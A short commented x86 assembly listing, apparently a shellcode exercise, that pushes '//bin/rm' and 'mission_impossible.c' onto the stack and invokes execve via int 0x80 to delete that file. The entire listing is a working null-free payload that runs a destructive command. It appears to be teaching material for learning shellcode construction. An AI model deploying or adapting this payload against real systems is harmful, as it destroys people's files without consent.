global _start

section .text
_start:
;------------------------------------------------------------------
;;int execve(const char *filename, char *const argv[], char *const envp[];
;------------------------------------------------------------------

	;push 0x00000000 on the Stack because the end of string

	xor eax, eax
	push eax
	
	;push //bin/rm in reverse i.e. mr/nib//
	
	push 0x6d722f6e
	push 0x69622f2f

	mov ebx,esp

	;push 0x00000000 on the Stack because the end of string 

	push eax
	mov edx, esp

	;push "mission_impossible.c" in reverse
	
	push 0x632e656c
	push 0x62697373
	push 0x6f706d69
	push 0x5f6e6f69
	push 0x7373696d
	mov esi,esp
	
	;push 0x00000000 on the Stack because the end of string 

	push eax

	;push the address of "mission_impossible.c" on the stack
	
	push esi

	;push the address of "//bin/rm" on the stack
	
	push ebx	
	mov ecx,esp

	mov al,11
	int 0x80
